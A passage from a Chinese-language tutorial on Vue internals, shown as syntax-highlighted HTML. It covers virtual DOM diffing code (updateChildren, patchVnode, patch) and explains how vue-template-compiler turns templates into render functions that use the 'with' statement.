      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>oldEndVnode <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        oldEndVnode <span class="token operator">=</span> oldCh<span class="token punctuation">[</span><span class="token operator">--</span>oldEndIdx<span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>newStartVnode <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        newStartVnode <span class="token operator">=</span> newCh<span class="token punctuation">[</span><span class="token operator">++</span>newStartIdx<span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>newEndVnode <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        newEndVnode <span class="token operator">=</span> newCh<span class="token punctuation">[</span><span class="token operator">--</span>newEndIdx<span class="token punctuation">]</span><span class="token punctuation">;</span>

      <span class="token comment">// 开始和开始对比--头头</span>
      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sameVnode</span><span class="token punctuation">(</span>oldStartVnode<span class="token punctuation">,</span> newStartVnode<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">patchVnode</span><span class="token punctuation">(</span>oldStartVnode<span class="token punctuation">,</span> newStartVnode<span class="token punctuation">,</span> insertedVnodeQueue<span class="token punctuation">)</span><span class="token punctuation">;</span>
        oldStartVnode <span class="token operator">=</span> oldCh<span class="token punctuation">[</span><span class="token operator">++</span>oldStartIdx<span class="token punctuation">]</span><span class="token punctuation">;</span>
        newStartVnode <span class="token operator">=</span> newCh<span class="token punctuation">[</span><span class="token operator">++</span>newStartIdx<span class="token punctuation">]</span><span class="token punctuation">;</span>
      
      <span class="token comment">// 结束和结束对比--尾尾</span>
      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sameVnode</span><span class="token punctuation">(</span>oldEndVnode<span class="token punctuation">,</span> newEndVnode<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">patchVnode</span><span class="token punctuation">(</span>oldEndVnode<span class="token punctuation">,</span> newEndVnode<span class="token punctuation">,</span> insertedVnodeQueue<span class="token punctuation">)</span><span class="token punctuation">;</span>
        oldEndVnode <span class="token operator">=</span> oldCh<span class="token punctuation">[</span><span class="token operator">--</span>oldEndIdx<span class="token punctuation">]</span><span class="token punctuation">;</span>
        newEndVnode <span class="token operator">=</span> newCh<span class="token punctuation">[</span><span class="token operator">--</span>newEndIdx<span class="token punctuation">]</span><span class="token punctuation">;</span>

      <span class="token comment">// 开始和结束对比--头尾</span>
      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sameVnode</span><span class="token punctuation">(</span>oldStartVnode<span class="token punctuation">,</span> newEndVnode<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// Vnode moved right</span>
        <span class="token function">patchVnode</span><span class="token punctuation">(</span>oldStartVnode<span class="token punctuation">,</span> newEndVnode<span class="token punctuation">,</span> insertedVnodeQueue<span class="token punctuation">)</span><span class="token punctuation">;</span>
        api<span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>parentElm<span class="token punctuation">,</span> oldStartVnode<span class="token punctuation">.</span>elm<span class="token operator">!</span><span class="token punctuation">,</span> api<span class="token punctuation">.</span><span class="token function">nextSibling</span><span class="token punctuation">(</span>oldEndVnode<span class="token punctuation">.</span>elm<span class="token operator">!</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        oldStartVnode <span class="token operator">=</span> oldCh<span class="token punctuation">[</span><span class="token operator">++</span>oldStartIdx<span class="token punctuation">]</span><span class="token punctuation">;</span>
        newEndVnode <span class="token operator">=</span> newCh<span class="token punctuation">[</span><span class="token operator">--</span>newEndIdx<span class="token punctuation">]</span><span class="token punctuation">;</span>

      <span class="token comment">// 结束和开始对比--尾头</span>
      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sameVnode</span><span class="token punctuation">(</span>oldEndVnode<span class="token punctuation">,</span> newStartVnode<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// Vnode moved left</span>
        <span class="token function">patchVnode</span><span class="token punctuation">(</span>oldEndVnode<span class="token punctuation">,</span> newStartVnode<span class="token punctuation">,</span> insertedVnodeQueue<span class="token punctuation">)</span><span class="token punctuation">;</span>
        api<span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>parentElm<span class="token punctuation">,</span> oldEndVnode<span class="token punctuation">.</span>elm<span class="token operator">!</span><span class="token punctuation">,</span> oldStartVnode<span class="token punctuation">.</span>elm<span class="token operator">!</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        oldEndVnode <span class="token operator">=</span> oldCh<span class="token punctuation">[</span><span class="token operator">--</span>oldEndIdx<span class="token punctuation">]</span><span class="token punctuation">;</span>
        newStartVnode <span class="token operator">=</span> newCh<span class="token punctuation">[</span><span class="token operator">++</span>newStartIdx<span class="token punctuation">]</span><span class="token punctuation">;</span>

      <span class="token comment">// 以上四个都未命中</span>
      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>oldKeyToIdx <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          oldKeyToIdx <span class="token operator">=</span> <span class="token function">createKeyToOldIdx</span><span class="token punctuation">(</span>oldCh<span class="token punctuation">,</span> oldStartIdx<span class="token punctuation">,</span> oldEndIdx<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token comment">// 拿新节点 key ，能否对应上 oldCh 中的某个节点的 key</span>
        idxInOld <span class="token operator">=</span> oldKeyToIdx<span class="token punctuation">[</span>newStartVnode<span class="token punctuation">.</span>key <span class="token keyword">as</span> string<span class="token punctuation">]</span><span class="token punctuation">;</span>
  
        <span class="token comment">// 没对应上</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isUndef</span><span class="token punctuation">(</span>idxInOld<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// New element</span>
          api<span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>parentElm<span class="token punctuation">,</span> <span class="token function">createElm</span><span class="token punctuation">(</span>newStartVnode<span class="token punctuation">,</span> insertedVnodeQueue<span class="token punctuation">)</span><span class="token punctuation">,</span> oldStartVnode<span class="token punctuation">.</span>elm<span class="token operator">!</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          newStartVnode <span class="token operator">=</span> newCh<span class="token punctuation">[</span><span class="token operator">++</span>newStartIdx<span class="token punctuation">]</span><span class="token punctuation">;</span>
        
        <span class="token comment">// 对应上了</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
          <span class="token comment">// 对应上 key 的节点</span>
          elmToMove <span class="token operator">=</span> oldCh<span class="token punctuation">[</span>idxInOld<span class="token punctuation">]</span><span class="token punctuation">;</span>

          <span class="token comment">// sel 是否相等（sameVnode 的条件）</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>elmToMove<span class="token punctuation">.</span>sel <span class="token operator">!==</span> newStartVnode<span class="token punctuation">.</span>sel<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// New element</span>
            api<span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>parentElm<span class="token punctuation">,</span> <span class="token function">createElm</span><span class="token punctuation">(</span>newStartVnode<span class="token punctuation">,</span> insertedVnodeQueue<span class="token punctuation">)</span><span class="token punctuation">,</span> oldStartVnode<span class="token punctuation">.</span>elm<span class="token operator">!</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          
          <span class="token comment">// sel 相等，key 相等</span>
          <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token function">patchVnode</span><span class="token punctuation">(</span>elmToMove<span class="token punctuation">,</span> newStartVnode<span class="token punctuation">,</span> insertedVnodeQueue<span class="token punctuation">)</span><span class="token punctuation">;</span>
            oldCh<span class="token punctuation">[</span>idxInOld<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">undefined</span> <span class="token keyword">as</span> any<span class="token punctuation">;</span>
            api<span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>parentElm<span class="token punctuation">,</span> elmToMove<span class="token punctuation">.</span>elm<span class="token operator">!</span><span class="token punctuation">,</span> oldStartVnode<span class="token punctuation">.</span>elm<span class="token operator">!</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span>
          newStartVnode <span class="token operator">=</span> newCh<span class="token punctuation">[</span><span class="token operator">++</span>newStartIdx<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>oldStartIdx <span class="token operator">&lt;=</span> oldEndIdx <span class="token operator">||</span> newStartIdx <span class="token operator">&lt;=</span> newEndIdx<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>oldStartIdx <span class="token operator">&gt;</span> oldEndIdx<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        before <span class="token operator">=</span> newCh<span class="token punctuation">[</span>newEndIdx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token keyword">null</span> <span class="token operator">:</span> newCh<span class="token punctuation">[</span>newEndIdx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>elm<span class="token punctuation">;</span>
        <span class="token function">addVnodes</span><span class="token punctuation">(</span>parentElm<span class="token punctuation">,</span> before<span class="token punctuation">,</span> newCh<span class="token punctuation">,</span> newStartIdx<span class="token punctuation">,</span> newEndIdx<span class="token punctuation">,</span> insertedVnodeQueue<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token function">removeVnodes</span><span class="token punctuation">(</span>parentElm<span class="token punctuation">,</span> oldCh<span class="token punctuation">,</span> oldStartIdx<span class="token punctuation">,</span> oldEndIdx<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">function</span> <span class="token function">patchVnode</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token literal-property property">oldVnode</span><span class="token operator">:</span> VNode<span class="token punctuation">,</span> <span class="token literal-property property">vnode</span><span class="token operator">:</span> VNode<span class="token punctuation">,</span> <span class="token literal-property property">insertedVnodeQueue</span><span class="token operator">:</span> VNodeQueue</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 执行 prepatch hook</span>
    <span class="token keyword">const</span> hook <span class="token operator">=</span> vnode<span class="token punctuation">.</span>data<span class="token operator">?.</span>hook<span class="token punctuation">;</span>
    hook<span class="token operator">?.</span>prepatch<span class="token operator">?.</span><span class="token punctuation">(</span>oldVnode<span class="token punctuation">,</span> vnode<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// 设置 vnode.elem</span>
    <span class="token keyword">const</span> elm <span class="token operator">=</span> vnode<span class="token punctuation">.</span>elm <span class="token operator">=</span> oldVnode<span class="token punctuation">.</span>elm<span class="token operator">!</span><span class="token punctuation">;</span>
  
    <span class="token comment">// 旧 children</span>
    <span class="token keyword">let</span> oldCh <span class="token operator">=</span> oldVnode<span class="token punctuation">.</span>children <span class="token keyword">as</span> VNode<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token comment">// 新 children</span>
    <span class="token keyword">let</span> ch <span class="token operator">=</span> vnode<span class="token punctuation">.</span>children <span class="token keyword">as</span> VNode<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>oldVnode <span class="token operator">===</span> vnode<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
  
    <span class="token comment">// hook 相关</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>vnode<span class="token punctuation">.</span>data <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cbs<span class="token punctuation">.</span>update<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> cbs<span class="token punctuation">.</span>update<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">(</span>oldVnode<span class="token punctuation">,</span> vnode<span class="token punctuation">)</span><span class="token punctuation">;</span>
      vnode<span class="token punctuation">.</span>data<span class="token punctuation">.</span>hook<span class="token operator">?.</span>update<span class="token operator">?.</span><span class="token punctuation">(</span>oldVnode<span class="token punctuation">,</span> vnode<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// vnode.text === undefined （vnode.children 一般有值）</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isUndef</span><span class="token punctuation">(</span>vnode<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token comment">// 新旧都有 children</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isDef</span><span class="token punctuation">(</span>oldCh<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isDef</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>oldCh <span class="token operator">!==</span> ch<span class="token punctuation">)</span> <span class="token function">updateChildren</span><span class="token punctuation">(</span>elm<span class="token punctuation">,</span> oldCh<span class="token punctuation">,</span> ch<span class="token punctuation">,</span> insertedVnodeQueue<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token comment">// 新 children 有，旧 children 无 （旧 text 有）</span>
      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isDef</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 清空 text</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isDef</span><span class="token punctuation">(</span>oldVnode<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span> api<span class="token punctuation">.</span><span class="token function">setTextContent</span><span class="token punctuation">(</span>elm<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 添加 children</span>
        <span class="token function">addVnodes</span><span class="token punctuation">(</span>elm<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> ch<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> ch<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> insertedVnodeQueue<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token comment">// 旧 child 有，新 child 无</span>
      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isDef</span><span class="token punctuation">(</span>oldCh<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 移除 children</span>
        <span class="token function">removeVnodes</span><span class="token punctuation">(</span>elm<span class="token punctuation">,</span> oldCh<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> oldCh<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token comment">// 旧 text 有</span>
      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isDef</span><span class="token punctuation">(</span>oldVnode<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        api<span class="token punctuation">.</span><span class="token function">setTextContent</span><span class="token punctuation">(</span>elm<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>

    <span class="token comment">// else : vnode.text !== undefined （vnode.children 无值）</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>oldVnode<span class="token punctuation">.</span>text <span class="token operator">!==</span> vnode<span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token comment">// 移除旧 children</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isDef</span><span class="token punctuation">(</span>oldCh<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">removeVnodes</span><span class="token punctuation">(</span>elm<span class="token punctuation">,</span> oldCh<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> oldCh<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token comment">// 设置新 text</span>
      api<span class="token punctuation">.</span><span class="token function">setTextContent</span><span class="token punctuation">(</span>elm<span class="token punctuation">,</span> vnode<span class="token punctuation">.</span>text<span class="token operator">!</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    hook<span class="token operator">?.</span>postpatch<span class="token operator">?.</span><span class="token punctuation">(</span>oldVnode<span class="token punctuation">,</span> vnode<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token function">patch</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token literal-property property">oldVnode</span><span class="token operator">:</span> VNode <span class="token operator">|</span> Element<span class="token punctuation">,</span> <span class="token literal-property property">vnode</span><span class="token operator">:</span> VNode</span><span class="token punctuation">)</span><span class="token operator">:</span> VNode <span class="token punctuation">{</span>
    <span class="token keyword">let</span> <span class="token literal-property property">i</span><span class="token operator">:</span> number<span class="token punctuation">,</span> <span class="token literal-property property">elm</span><span class="token operator">:</span> Node<span class="token punctuation">,</span> <span class="token literal-property property">parent</span><span class="token operator">:</span> Node<span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token literal-property property">insertedVnodeQueue</span><span class="token operator">:</span> VNodeQueue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token comment">// 执行 pre hook</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cbs<span class="token punctuation">.</span>pre<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> cbs<span class="token punctuation">.</span>pre<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// 第一个参数不是 vnode</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isVnode</span><span class="token punctuation">(</span>oldVnode<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token comment">// 创建一个空的 vnode ，关联到这个 DOM 元素</span>
      oldVnode <span class="token operator">=</span> <span class="token function">emptyNodeAt</span><span class="token punctuation">(</span>oldVnode<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 相同的 vnode（key 和 sel 都相等）</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sameVnode</span><span class="token punctuation">(</span>oldVnode<span class="token punctuation">,</span> vnode<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token comment">// vnode 对比</span>
      <span class="token function">patchVnode</span><span class="token punctuation">(</span>oldVnode<span class="token punctuation">,</span> vnode<span class="token punctuation">,</span> insertedVnodeQueue<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">// 不同的 vnode ，直接删掉重建</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      elm <span class="token operator">=</span> oldVnode<span class="token punctuation">.</span>elm<span class="token operator">!</span><span class="token punctuation">;</span>
      parent <span class="token operator">=</span> api<span class="token punctuation">.</span><span class="token function">parentNode</span><span class="token punctuation">(</span>elm<span class="token punctuation">)</span><span class="token punctuation">;</span>

      <span class="token comment">// 重建</span>
      <span class="token function">createElm</span><span class="token punctuation">(</span>vnode<span class="token punctuation">,</span> insertedVnodeQueue<span class="token punctuation">)</span><span class="token punctuation">;</span>

      <span class="token keyword">if</span> <span class="token punctuation">(</span>parent <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        api<span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>parent<span class="token punctuation">,</span> vnode<span class="token punctuation">.</span>elm<span class="token operator">!</span><span class="token punctuation">,</span> api<span class="token punctuation">.</span><span class="token function">nextSibling</span><span class="token punctuation">(</span>elm<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">removeVnodes</span><span class="token punctuation">(</span>parent<span class="token punctuation">,</span> <span class="token punctuation">[</span>oldVnode<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> insertedVnodeQueue<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      insertedVnodeQueue<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>data<span class="token operator">!</span><span class="token punctuation">.</span>hook<span class="token operator">!</span><span class="token punctuation">.</span>insert<span class="token operator">!</span><span class="token punctuation">(</span>insertedVnodeQueue<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cbs<span class="token punctuation">.</span>post<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> cbs<span class="token punctuation">.</span>post<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> vnode<span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><h3 id="模板编译"><a href="#模板编译" class="header-anchor">#</a> 模板编译</h3> <p><strong>前置知识</strong></p> <ul><li>模板是<code>vue</code>开发中最常用的，即与使用相关联的原理</li> <li>它不是<code>HTML</code>，有指令、插值、JS表达式，能实现循环、判断，因此模板一定转为<code>JS</code>代码，即模板编译</li> <li>面试不会直接问，但会通过<code>组件渲染和更新过程</code>考察</li></ul> <p><strong>模板编译</strong></p> <ul><li><code>vue template compiler</code>将模板编译为<code>render</code>函数</li> <li>执行<code>render</code>函数，生成<code>vnode</code></li> <li>基于<code>vnode</code>在执行<code>patch</code>和<code>diff</code></li> <li>使用<code>webpack vue loader</code>，会在开发环境下编译模板</li></ul> <p><strong>with语法</strong></p> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/02/6f9943fe553bfa0a.png" loading="lazy" class="lazy"></p> <ul><li>改变<code>{}</code>内自由变量的查找规则，当做<code>obj</code>属性来查找</li> <li>如果找不到匹配的<code>obj</code>属性，就会报错</li> <li><code>with</code>要慎用，它打破了作用域规则，易读性变差</li></ul> <p><strong>vue组件中使用render代替template</strong></p> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/02/84a8702352c0d1a7.png" loading="lazy" class="lazy"></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 执行 node index.js</span>

<span class="token keyword">const</span> compiler <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'vue-template-compiler'</span><span class="token punctuation">)</span>

<span class="token comment">// 插值</span>
<span class="token keyword">const</span> template <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;p&gt;{{message}}&lt;/p&gt;</span><span class="token template-punctuation string">`</span></span>
<span class="token keyword">with</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">_c</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token function">_v</span><span class="token punctuation">(</span><span class="token function">_s</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
<span class="token comment">// this就是vm的实例, message等变量会从vm上读取，触发getter</span>
<span class="token comment">// _c =&gt; createElement 也就是h函数 =&gt; 返回vnode</span>
<span class="token comment">// _v =&gt; createTextVNode </span>
<span class="token comment">// _s =&gt; toString </span>
<span class="token comment">// 也就是这样 with(this){return createElement('p',[createTextVNode(toString(message))])}</span>

<span class="token comment">// h -&gt; vnode</span>
<span class="token comment">// createElement -&gt; vnode</span>

<span class="token comment">// 表达式</span>
<span class="token keyword">const</span> template <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;p&gt;{{flag ? message : 'no message found'}}&lt;/p&gt;</span><span class="token template-punctuation string">`</span></span>
<span class="token comment">// with(this){return _c('p',[_v(_s(flag ? message : 'no message found'))])}</span>

<span class="token comment">// 属性和动态属性</span>
<span class="token keyword">const</span> template <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;div id=&quot;div1&quot; class=&quot;container&quot;&gt;
        &lt;img :src=&quot;imgUrl&quot;/&gt;
    &lt;/div&gt;
</span><span class="token template-punctuation string">`</span></span>
<span class="token keyword">with</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">_c</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">,</span>
     <span class="token punctuation">{</span><span class="token literal-property property">staticClass</span><span class="token operator">:</span><span class="token string">&quot;container&quot;</span><span class="token punctuation">,</span><span class="token literal-property property">attrs</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token string-property property">&quot;id&quot;</span><span class="token operator">:</span><span class="token string">&quot;div1&quot;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
     <span class="token punctuation">[</span>
         <span class="token function">_c</span><span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token literal-property property">attrs</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token string-property property">&quot;src&quot;</span><span class="token operator">:</span>imgUrl<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span>

<span class="token comment">// 条件</span>
<span class="token keyword">const</span> template <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;div&gt;
        &lt;p v-if=&quot;flag === 'a'&quot;&gt;A&lt;/p&gt;
        &lt;p v-else&gt;B&lt;/p&gt;
    &lt;/div&gt;
</span><span class="token template-punctuation string">`</span></span>
